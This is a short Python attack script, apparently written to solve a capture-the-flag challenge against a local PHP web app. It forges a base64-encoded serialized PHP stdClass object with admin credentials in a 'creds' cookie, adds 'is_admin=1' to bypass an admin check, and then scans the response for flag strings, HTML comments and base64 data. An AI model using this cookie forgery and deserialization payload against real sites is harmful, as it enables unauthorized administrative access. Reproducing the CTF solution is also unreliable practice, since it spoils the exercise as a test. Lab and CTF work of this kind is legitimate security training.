import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# Focus on stdClass which showed admin check bypassed
print("[*] Detailed analysis of stdClass (admin check bypassed)...\n")

payload = 'O:8:"stdClass":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'
payload_b64 = base64.b64encode(payload.encode()).decode()

headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
resp = requests.get(base_url, headers=headers)

print(f"stdClass Payload: {payload}")
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.content)}B")
print(f"\n[+] FULL RESPONSE:\n")
print(resp.text)

print("\n" + "="*80 + "\n")

# Check for flag patterns
flag_patterns = [
    r'FLAG\{[^}]+\}',
    r'flag\{[^}]+\}',
    r'FLAG\[[^\]]+\]',
    r'flag\[[^\]]+\]',
    r'[A-Z]{2,}\{[^}]+\}'
]

print("[*] Searching for flag patterns...")
for pattern in flag_patterns:
    matches = re.findall(pattern, resp.text, re.IGNORECASE)
    if matches:
        print(f"    [!!!] Found with pattern '{pattern}': {matches}")

# Also check for any hidden content in HTML comments
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
if comments:
    print("\n[*] HTML Comments found:")
    for c in comments:
        print(f"    {c[:200]}")

# Check for base64 encoded content in response
b64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
if b64_matches:
    print("\n[*] Potential base64 strings found:")
    for b64 in b64_matches[:5]:
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if decoded and len(decoded) > 5:
                print(f"    {b64[:30]}... -> {decoded[:50]}")
        except:
            pass

